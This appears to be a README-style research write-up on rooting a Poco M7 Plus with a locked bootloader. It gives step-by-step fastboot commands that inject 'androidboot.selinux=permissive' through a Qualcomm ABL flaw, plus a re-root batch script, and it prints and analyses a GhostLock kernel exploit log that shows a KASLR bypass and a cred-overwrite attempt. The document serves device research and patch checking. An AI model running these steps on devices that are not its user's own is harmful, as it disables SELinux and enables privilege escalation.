# Poco M7 Plus (SM6375) â€” Temporary Root Research: Qualcomm GBL Exploit + GhostLock Kernel Analysis

> **Disclaimer:** This document is written purely for **educational and security research purposes**. All testing was performed on my own device. I am not responsible for bricked devices, data loss, or misuse of this information. The vulnerabilities discussed here are **already publicly disclosed and patched**. Do not attempt this on devices you do not own.

---

## Table of Contents

1. [Device & Environment](#1-device--environment)
2. [Research Overview â€” Two Approaches](#2-research-overview--two-approaches)
3. [Approach A: Qualcomm GBL Exploit (Fastboot Route)](#3-approach-a-qualcomm-gbl-exploit-fastboot-route)
   - [Vulnerability Background](#vulnerability-background)
   - [Exploit Chain Explained](#exploit-chain-explained)
   - [Step-by-Step Reproduction](#step-by-step-reproduction)
   - [Verification](#verification)
4. [Approach B: GhostLock Kernel Exploit (Attempted)](#4-approach-b-ghostlock-kernel-exploit-attempted)
   - [What is GhostLock?](#what-is-ghostlock)
   - [Full Execution Log](#full-execution-log)
   - [Deep Log Analysis](#deep-log-analysis)
   - [Root Cause of Kernel Panic](#root-cause-of-kernel-panic)
   - [Kernel 6.1 vs 6.6+ â€” Why It Matters](#kernel-61-vs-66--why-it-matters)
5. [Comparison: GBL vs GhostLock on This Device](#5-comparison-gbl-vs-ghostlock-on-this-device)
6. [Risk & Security Implications](#6-risk--security-implications)
7. [Patch Status & How to Check](#7-patch-status--how-to-check)
8. [References & Credits](#8-references--credits)

---

## 1. Device & Environment

| Field | Value |
|---|---|
| **Device** | Poco M7 Plus 5G (codename: `spring`) |
| **Chipset** | Qualcomm SM6375 (Snapdragon 6s Gen 3) |
| **Architecture** | AArch64, KASLR enabled |
| **SELinux** | Enforcing (before exploit) |
| **Bootloader** | LOCKED |
| **Test Platform** | Windows 11, ADB Platform Tools |

### Firmware Versions Tested During Research

| HyperOS Version | Kernel Version | GhostLock Result | GBL Exploit Result |
|---|---|---|---|
| **2.0.202.0** | `6.1.118-android14-11-ga3b9c44908dd-ab13320413` | âŒ Kernel Panic | âœ… Working |
| **2.0.208.0** | `6.1.138-android14-11-g51f8c580613d-ab13911623` | âŒ Kernel Panic | âœ… Working |

> **Research Note:** I initially tested on HyperOS 2.0.202.0 where GhostLock caused kernel panic. I then updated to 2.0.208.0 to check if the newer kernel build (6.1.118 â†’ 6.1.138) would resolve GhostLock's instability. The panic persisted â€” both builds share the same 6.1 `pselect`/`fd_set` internal layout that GhostLock cannot handle. The GBL exploit worked on both versions.

---

## 2. Research Overview â€” Two Approaches

During this research, I tested **two independent exploit paths** to achieve temporary root on this device without unlocking the bootloader:

| | Approach A: GBL Exploit | Approach B: GhostLock |
|---|---|---|
| **Layer** | Bootloader (ABL/fastboot) | Kernel (Linux 6.1) |
| **CVE** | CVE-2026-24088 | N/A (GitHub PoC) |
| **Result on this device** | âœ… **Working** | âŒ **Kernel Panic** |
| **Root Type** | Temporary (tethered) | Temporary (tethered) |
| **Requires ADB?** | Yes (fastboot mode) | Yes (shell access) |
| **Kernel version sensitive?** | No | Yes â€” only stable on 6.6â€“6.12 |

The GBL exploit worked. GhostLock failed with a kernel panic due to a kernel version mismatch. Both findings are documented in detail below.

---

## 3. Approach A: Qualcomm GBL Exploit (Fastboot Route)

### Vulnerability Background

**CVE-2026-24088** affects Qualcomm's Android Boot Loader (ABL) across multiple devices. The vulnerability chain was discovered in January 2026, patched by Qualcomm in February 2026, and assigned a CVE in June 2026.

**Discovery Timeline:**

```
Jan 2026 â†’ Vulnerability discovered during ABL unpacking & analysis
Feb 2026 â†’ Qualcomm patches: QcomModulePkg: Fix propagation of untrusted input into kernel cmdline
Mar 2026 â†’ Public PoC released; Xiaomi begins rolling out HyperOS 3.0.304.0 (patched)
Jun 2026 â†’ CVE-2026-24088 officially assigned in Qualcomm Security Bulletin
```

### Exploit Chain Explained

The exploit works as a **three-stage chain** at the bootloader level:

#### Stage 1 â€” Unsigned GBL Execution
In Android 16, Qualcomm's ABL loads the Generic Bootloader (GBL) from the `efisp` partition. The critical flaw: **ABL only checks if the binary is a valid UEFI application â€” it does NOT verify its cryptographic signature.** This means a custom, unsigned UEFI application can be placed in `efisp` and it will execute at bootloader stage with full privileges.

#### Stage 2 â€” Kernel Command-Line Injection
The `fastboot oem set-gpu-preemption` command is designed to configure GPU hardware preemption settings. However, it **lacks input sanitization**. The ABL directly concatenates the provided argument into the kernel command line without filtering. 

By passing `androidboot.selinux=permissive` as an additional argument:

```
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```

...the bootloader writes `androidboot.selinux=permissive` into the kernel cmdline, which Android's `init` process reads at boot, setting SELinux to permissive mode system-wide.

**Why does this work?** The kernel parameter `androidboot.selinux` is processed early in the boot chain by Android `init` before any userspace SELinux policy is loaded. Setting it to `permissive` means SELinux will **log violations but not enforce them** â€” effectively disabling the primary MAC (Mandatory Access Control) layer.

#### Stage 3 â€” Unlock Flag Manipulation (Optional)
A custom UEFI application placed in `efisp` can manipulate the `is_unlocked` and `is_unlocked_critical` flags in the bootloader's persistent storage, permanently unlocking the bootloader. (**This step was NOT tested â€” it carries hard brick risk.**)

### Step-by-Step Reproduction

> âš ï¸ **Stop before proceeding:** Run the patch check in Section 7 first. If your device is patched, none of this will work.

**Prerequisites:**
- Windows PC with ADB/Fastboot (Platform Tools)
- Original USB cable
- Device on HyperOS **2.0.208.0 or earlier** (do NOT update)
- USB Debugging enabled
- **KernelSU Manager** APK **or** **Resuski Manager** APK installed on the phone

> **Which root manager?** Both work with this exploit. KernelSU is the standard choice. Resuski Manager is an alternative that also detects the permissive SELinux state and provides root management with module support.

> **Do I need OEM Unlocking enabled in Developer Options?**
> **No — and this is one of the most important aspects of this exploit.**
> Standard bootloader unlocking (astboot flashing unlock) requires OEM Unlocking to be toggled in Developer Options, plus a Mi Account waiting period on Xiaomi/POCO devices.
> The astboot oem set-gpu-preemption command operates at the **ABL (Android Boot Loader) level** — it is processed **before** the OS ever checks OEM unlock status. CVE-2026-24088 is a missing input sanitization flaw in the ABL itself, so it completely bypasses the OEM unlock gate. Your bootloader stays **LOCKED** throughout this entire process.
> If you saw a guide that said "enable OEM Unlocking first" — that instruction is for a **different** (standard) unlock method, not this exploit.

---

**Step 1: Enter Fastboot Mode**

```bash
adb reboot bootloader
```

Wait for the device to show the fastboot screen.

---

**Step 2: Test Vulnerability**

```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```

- `OKAY` â†’ Device is **vulnerable** âœ… â€” continue
- `FAILED (remote: 'Set GPU HW Preemption: Invalid Argument')` â†’ Device is **patched** âŒ â€” stop here

---

**Step 3: Boot with Injected Cmdline**

```bash
fastboot continue
```

The device boots normally, but SELinux is now in permissive mode. This state persists until reboot.

---

**Step 4: Verify SELinux State**

```bash
adb shell getenforce
```

Expected: `Permissive`

---

**Step 5: Gain Root via Root Manager**

**Option A â€” KernelSU Manager:**
```bash
# Open KernelSU Manager on device
# It detects the permissive SELinux state
# Tap "Jailbreak" / grant button to activate root

# Verify from PC:
adb shell su -c id
```

**Option B â€” Resuski Manager:**
```bash
# Open Resuski Manager on device
# Enable "Jailbreak Mode" from the main screen
# Root will appear as active â€” modules also load correctly

# Verify from PC:
adb shell su -c id
```

Expected output (both):
```
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
```

> **Important behavior:** After enabling jailbreak mode once, if the phone is turned off and turned back on, you must **re-run the fastboot injection first** (Steps 1â€“3), then reopen the root manager app and re-enable jailbreak mode. The root is tethered â€” the manager app correctly shows root and modules as working once the SELinux permissive state is re-established via fastboot.

---

**Step 6: Verify Full Root State**

```bash
# SELinux mode
adb shell getenforce

# Root identity
adb shell su -c id

# KernelSU version
adb shell su -c "cat /data/adb/ksu/version"

# SELinux enforce flag in kernel
adb shell su -c "cat /sys/fs/selinux/enforce"
```

---

**Step 7: Persistence (Optional)**

Root is **temporary (tethered)** â€” it is lost on every reboot. To automate re-rooting after each reboot, create a script on your PC:

```bash
# re-root.bat (Windows)
@echo off
echo Rebooting to fastboot...
adb reboot bootloader
timeout /t 10
echo Injecting SELinux permissive...
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
timeout /t 2
fastboot continue
echo Done. Wait for device to boot, then open KernelSU.
```

> âš ï¸ Do NOT flash any partition unless you fully understand the consequences.

---

### Verification

| Check | Command | Expected Output |
|---|---|---|
| SELinux mode | `adb shell getenforce` | `Permissive` |
| Root identity | `adb shell su -c id` | `uid=0(root)` |
| KSU version | `adb shell su -c "cat /data/adb/ksu/version"` | Version string |
| Kernel enforce flag | `adb shell su -c "cat /sys/fs/selinux/enforce"` | `0` |

---

## 4. Approach B: GhostLock Kernel Exploit (Attempted)

### What is GhostLock?

GhostLock is a **kernel-level privilege escalation exploit** (CVE-2026-43499) published on GitHub. Unlike the GBL exploit (which operates at the bootloader layer), GhostLock operates entirely within the running Linux kernel. It targets a vulnerability in the kernel's **futex subsystem** combined with the **TCP zerocopy** or **pselect** networking paths to achieve a Use-After-Free (UAF) condition, ultimately overwriting the `cred` structure of a process to grant it root privileges.

The easiest way to run GhostLock is via the **[GhostLock One-Tap App](https://github.com/YuKongA/ghostlock-app)** by YuKongA â€” a standalone Android app that wraps the exploit with a simple UI, no manual binary deployment needed.

**Supported kernel range (stable):** 6.6 â€“ 6.12
**On kernel 6.1:** Unstable â€” prone to kernel panic (documented below with full log)

### Full Execution Log

This is the complete output from my test run on the Poco M7 Plus (Kernel 6.1.138):

```
C:\adb platform>adb shell /data/local/tmp/ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin

[*] kernel: 6.1.138-android14-11-g51f8c580613d-ab13911623
[+] resolved profile loaded: 6.1.138-android14-11-g51f8c580613d-ab13911623
[*] cpu pair: main=0 consumer=1
[*] runtime home=/data/local/tmp script=/data/local/tmp/.ghostlock_root.sh
[*] debug.execution.begin release=6.1.138-android14-11-g51f8c580613d-ab13911623
[*] debug.execution.recommended_cpus.main=0
[*] debug.execution.recommended_cpus.consumer=1
[*] debug.execution.selected_cpus.main=0
[*] debug.execution.selected_cpus.consumer=1
[*] debug.execution.heap.prepare_max_attempts=4
[*] debug.execution.heap.prepare_timeout_ms=240000
[*] debug.execution.heap.kernelsnitch_timeout_ms=60000
[*] debug.execution.race.route_wait_ms=1000
[*] debug.execution.race.setup_settle_us=50000
[*] debug.execution.race.state_poll_interval_us=1000
[*] debug.execution.stages.w1_attempts=15
[*] debug.execution.stages.w1_settle_us=100000
[*] debug.execution.stages.w1_scratch_repair_attempts=3
[*] debug.execution.stages.w2_attempts=15
[*] debug.execution.stages.w2_settle_us=100000
[*] debug.execution.stages.w3_chain_rounds=3
[*] debug.execution.stages.w3_attempts=6
[*] debug.execution.stages.w3_settle_us=50000
[*] debug.execution.routes.tcp_zerocopy.attempts=0
[*] debug.execution.routes.tcp_zerocopy.arm_sequence=0
[*] debug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=0
[*] debug.execution.routes.select_stack.enter_delay_us=50000
[*] debug.execution.routes.select_stack.timeout_us=200000
[*] debug.execution.routes.select_stack.consumer_max_calls=1
[*] debug.execution.routes.select_stack.consumer_burst_calls=1
[*] debug.execution.handoff.pre_dispatch_settle_ms=2000
[*] debug.execution.handoff.module_poll_attempts=30
[*] debug.execution.handoff.module_poll_interval_ms=100
[*] debug.execution.handoff.enforce_poll_attempts=200
[*] debug.execution.handoff.enforce_poll_interval_ms=100
[*] debug.execution.end
[*] soc: qcom/other; kernel_phys_load=0xa8000000
[*] init_cred image=ffffffc082001a68 alias=ffffff802a001a68
[*] root script written path=/data/local/tmp/.ghostlock_root.sh bytes=6081
[*] iomem cache: no usable dump, keeping the built-in geometry
[+] startup context pid=9724 uid=2000 euid=2000 gid=2000 egid=2000 boot_ms=5712461 attr=u:r:shell:s0 enforce=1
[+] startup limits pid=9724 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[+] build config pid=9724 label=ghostlock_oplus slide=pselect main=pselect
[+] p0 profile pid=9724 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff8029fe29c8 bootid_data=ffffff802a24a458 init_task=ffffff8029fef600 root_tg=ffffff802a1d7580 sysctl_bootid=ffffff802a24a458
[*] p0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[*] main thread running on cpu=0
[*] [T+0ms] exploit start
[*] [T+0ms] pre-W1 drain
[*] W1: SELinux attempt 1/15
[*] === W1: SELinux === target=0xffffff802a2293d0 mode=1 leaf=0
[*] [T+323ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +525ms
[*] [spray] finding futex collisions... +1220ms
[*] [spray] early collision screen 3/3 at 37%
[*] [spray] futex collisions found +2212ms
[*] [spray] mm_struct leaked=0xffffff80b33dd800 +2302ms
[*] [spray] payload ready +2305ms
[*] prepare_kernel_page ok attempt=1 +2600ms
[*] [T+2925ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=1
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[-] pselect cannot place wake_state waiter_word=14 global_word=15 words_per_set=5 nfds=320
[*] pselect route setup shift=1 page=ffffff80b33d8000 fake_lock=ffffff80b33d8000 fake_w0=ffffff80b33d8300 fake_task=ffffff80b33d8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000001 ex2=0000000000000000 ex3=ffffff80b33d8400
[*] pselect pre-select attempt=1/1 compact=0 +0ms

â†’ [DEVICE KERNEL PANIC â€” Spontaneous Reboot]
```

### Deep Log Analysis

#### Phase 1 â€” Profile & Initialization
```
[+] resolved profile loaded: 6.1.138-android14-11-...
```
GhostLock uses **prebuilt kernel profiles** â€” binary maps of important kernel structure offsets for a specific kernel build. This is critical: the exploit needs to know the exact memory addresses of structures like `task_struct`, `cred`, and `init_task`. The profile for this build was found and loaded successfully.

#### Phase 2 â€” CPU Pinning
```
[*] cpu pair: main=0 consumer=1
```
The exploit pins itself to two specific CPU cores. This is essential for the **race condition** at the heart of the exploit. By controlling which cores the threads run on, the exploit maximizes timing predictability. The race is between the `main` thread (cpu=0) and `consumer` thread (cpu=1).

#### Phase 3 â€” Critical Config Observation

> **Key finding:**
```
[*] debug.execution.routes.tcp_zerocopy.attempts=0   â† TCP Zerocopy DISABLED
[*] debug.execution.routes.select_stack.*            â† pselect route ACTIVE
```
The exploit automatically **detected that TCP Zerocopy is not viable on kernel 6.1** and fell back to the `pselect` route. This fallback is where the crash originates.

#### Phase 4 â€” KASLR Bypass & Memory Leak
```
[*] kernel_phys_load=0xa8000000
[*] delta=0000000028000000
[*] mm_struct leaked=0xffffff80b33dd800
[*] init_cred image=ffffffc082001a68
```
Despite the eventual crash, these stages **succeeded**:
- **KASLR bypassed**: The kernel's physical load address and ASLR slide were calculated
- **Kernel address leaked**: A live `mm_struct` kernel pointer was extracted to userspace
- **`init_cred` resolved**: The root credential structure's address was found

This shows the heap spray and `kernelsnitch` components work even on 6.1.

#### Phase 5 â€” The Crash Point
```
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35
[-] pselect cannot place wake_state waiter_word=14 global_word=15 words_per_set=5 nfds=320
```

This is where the kernel panic occurred.

### Root Cause of Kernel Panic

The crash comes down to a **state mismatch in the pselect route**:

```
waiter_word = 14
global_word = 15
words_per_set = 5
nfds = 320
```

**What the exploit expects:**
The `pselect` route works by parking a waiter thread at a **specific bit position** in a kernel `fd_set` bitmap. The exploit needs to control exactly where in kernel memory the `poll_list` or `fd_set` lands, so it can use a crafted fake `task_struct` pointer (`ex3=ffffff80b33d8400`) to trigger a controlled write.

**What happened:**
The `pselect6()` syscall in **kernel 6.1 handles `fd_set` word boundaries differently** from 6.6+. The calculation of `words_per_set` (how many 64-bit words make up the fd_set for a given `nfds` value) produces a different internal layout. The waiter thread was parked at word index 14, but the kernel's internal tracking showed word 15 as the active position â€” a **1-word offset mismatch**.

When the exploit tried to trigger the race with this misaligned state, the kernel attempted to dereference an address it computed from the misaligned word boundary â€” pointing to unmapped or invalid memory â€” and issued a **kernel panic** to protect memory integrity.

**In summary:** The exploit's `pselect` route geometry was calculated for kernel 6.6+ internal `fd_set` layout. Kernel 6.1 has a different layout, causing an off-by-one word alignment error that results in a bad memory dereference â†’ kernel panic â†’ device reboot.

### Kernel 6.1 vs 6.6+ â€” Why It Matters

| Component | Kernel 6.1 | Kernel 6.6+ |
|---|---|---|
| **TCP Zerocopy (`MSG_ZEROCOPY`)** | Present but different UAF window timing | Stable UAF trigger window |
| **`pselect6()` fd_set layout** | Different `words_per_set` boundary | Matches exploit's expected geometry |
| **Futex `REQUEUE_PI` behavior** | `errno=35 (EAGAIN)` on race â€” less predictable | More consistent race outcome |
| **SLUB allocator heap layout** | Different slab cache placement | Matches exploit's heap spray assumptions |
| **Result** | âŒ Kernel Panic | âœ… Exploit succeeds |

**Bottom line:** GhostLock is built and tested against the 6.6â€“6.12 kernel range. The internal memory layout assumptions baked into the exploit simply do not hold for 6.1. It is not a simple parameter tweak â€” the `pselect` route geometry and `fd_set` word boundary calculations would need to be recomputed for 6.1's internal structures.

---

## 5. Comparison: GBL vs GhostLock on This Device

| Factor | GBL Exploit âœ… | GhostLock âŒ |
|---|---|---|
| **Attack surface** | Bootloader (pre-kernel) | Running kernel |
| **Reliability on this device** | High | Kernel panic (unstable) |
| **Kernel version dependency** | None | Critical (6.6â€“6.12 only) |
| **KASLR bypass needed** | No | Yes (succeeded) |
| **SELinux bypass** | Via kernel cmdline injection | Via `cred` struct overwrite |
| **Persistence** | None (tethered) | None (tethered) |
| **Root mechanism** | KernelSU + permissive SELinux | Direct `cred` struct manipulation |
| **Patch vector** | ABL firmware update | Kernel patch |
| **Brick risk** | Low (fastboot only) | Low to Medium (kernel panic) |

**Key takeaway:** For this specific device (SM6375, kernel 6.1.138), the **GBL fastboot route is the correct approach**. GhostLock is technically more interesting as a pure kernel exploit but is fundamentally incompatible with 6.1 kernel's internal layout.

---

## 6. Risk & Security Implications

| Risk | Severity | Details |
|---|---|---|
| **Temporary root only** | High | Root is lost on every reboot. The fastboot injection must be re-run. |
| **SELinux permissive mode** | Critical | Disables Android's primary MAC layer. All processes run without SELinux restrictions. Do NOT use banking, payment, or sensitive apps while in this state. |
| **Kernel panic (GhostLock)** | Medium | Attempting GhostLock on 6.1 kernel will cause an unexpected reboot. No data corruption observed in testing, but risk exists. |
| **Hard brick** | Critical | Flashing incorrect partitions (especially `abl`, `xbl`, `hyp`) can permanently brick the device. Recovery requires EDL (9008) mode. |
| **Bootloop** | Medium | Some devices with Hynix/Toshiba storage have reported bootloops after similar exploits. |
| **Patch imminent** | Info | HyperOS 3.0.304.0+ closes CVE-2026-24088. Once updated, the GBL exploit will not work. |
| **Warrant void** | Medium | Modifying system state may void manufacturer warranty. |

---

## 7. Patch Status & How to Check

### Check Your ABL (Bootloader)

Use the [qualcomm-gbl-exploit-checker](https://github.com/chkndrp/qualcomm-gbl-exploit-checker):

```bash
# Extract abl.img from your firmware package, then:
python check.py abl.img
```

- `STATUS: VULNERABLE` â†’ Exploit may work
- `STATUS: PATCHED` â†’ Device is protected

### Quick Live Check (No Firmware Extraction Needed)

```bash
adb reboot bootloader
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```

- `OKAY` â†’ Vulnerable
- `FAILED (remote: 'Set GPU HW Preemption: Invalid Argument')` â†’ Patched

### Patched Firmware Versions

| Device | Safe (Patched) From |
|---|---|
| Poco M7 Plus 5G | HyperOS 3.0.304.0 |
| Redmi 15 5G | HyperOS 3.0.303.0 (confirmed patched â€” includes August 2026 security patch) |
| Other Xiaomi/POCO | Check Qualcomm June 2026 bulletin |

---

## 8. Troubleshooting

| Issue | Cause | Solution |
|---|---|---|
| `FAILED: Invalid Argument` | ABL is patched | Device is not vulnerable. Stop. |
| `getenforce` returns `Enforcing` | Exploit failed silently | Reboot to fastboot, re-run injection command |
| Device bootloops | Storage compatibility issue | Boot to fastboot, re-flash stock `boot.img` |
| KernelSU not detecting permissive state | KSU version mismatch | Ensure you use a KSU build compatible with Android 15 |
| GhostLock causes reboot | Kernel 6.1 incompatibility | Expected behavior â€” use GBL route instead |

---

## Screenshots â€” Proof of Working

> All screenshots taken on **Poco M7 Plus 5G â€” HyperOS 2.0.208.0** with bootloader **LOCKED**.

### 1. ReSukiSU (Resuski Manager) â€” Root Working
![ReSukiSU Working](images/ReSukiSU%20Working.jpg)

---

### 2. Modules â€” Fully Working
![Modules Working](images/Modules%20Working.jpg)

---

### 3. Device Info (Part 1)
![Device Info Part 1](images/Device%20Info%20Part%201.jpg)

---

### 4. Device Info (Part 2)
![Device Info Part 2](images/Device%20Info%20Part%202.jpg)

---

### 5. LSPosed â€” Working
![LSPosed Working](images/lsposed%20working.jpg)

---

### 6. Bootloader â€” Still LOCKED
![Bootloader Locked](images/Bootloader%20lock.jpg)

---

### 7. All Green Pass âœ…
![All Green Pass](images/All%20Green%20Pass.jpg)

---

## References

- [Qualcomm GBL Exploit PoC](https://github.com/kasnria001/qualcomm_gbl_exploit_poc)
- [GBL Exploit Checker](https://github.com/chkndrp/qualcomm-gbl-exploit-checker)
- [CVE-2026-24088 â€” NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-24088)
- [CVE-2026-43499 â€” GhostLock](https://nvd.nist.gov/vuln/detail/CVE-2026-43499)
- [GhostLock One-Tap App â€” YuKongA](https://github.com/YuKongA/ghostlock-app)
- [Qualcomm June 2026 Security Bulletin](https://www.qualcomm.com/company/product-security/bulletins)
- [XDA Guide â€” POCO F8 Pro / Redmi K90 (Annibale)](https://xdaforums.com/t/guide-exploit-poco-f8-pro-redmi-k90-annibale-unlock-immediate-bootloader-unlock-no-mi-account.4788141/)
- [KernelSU Project](https://kernelsu.org/)
- [Resuski Manager](https://github.com/rsuntk/KernelSU)

---

## Credits

| Who | Contribution |
|---|---|
| **Qualcomm ABL vulnerability researchers** | Discovery of the GBL authentication gap and cmdline injection flaw |
| **kasnria001** | Public PoC release of CVE-2026-24088 |
| **chkndrp** | ABL patch checker tool |
| **YuKongA** | GhostLock One-Tap App (CVE-2026-43499) â€” standalone Android UI wrapper |
| **XDA community** | Cross-device testing and documentation |
| **KernelSU developers** | Root management framework |
| **Resuski / rsuntk** | Alternative root manager with module support |
| **GhostLock authors** | Kernel exploit research (6.6â€“6.12 range) |
| **[aniketlab](https://github.com/aniketlab)** | Testing on SM6375 / kernel 6.1.118 + 6.1.138, firmware version comparison, GhostLock kernel panic analysis, dual-approach documentation |

---

*Tested on: Poco M7 Plus 5G â€” HyperOS 2.0.202.0 & 2.0.208.0 â€” Kernel 6.1.118 & 6.1.138 â€” September 2026*
*Research by [aniketlab](https://github.com/aniketlab) â€” conducted on personal device for educational purposes only.*


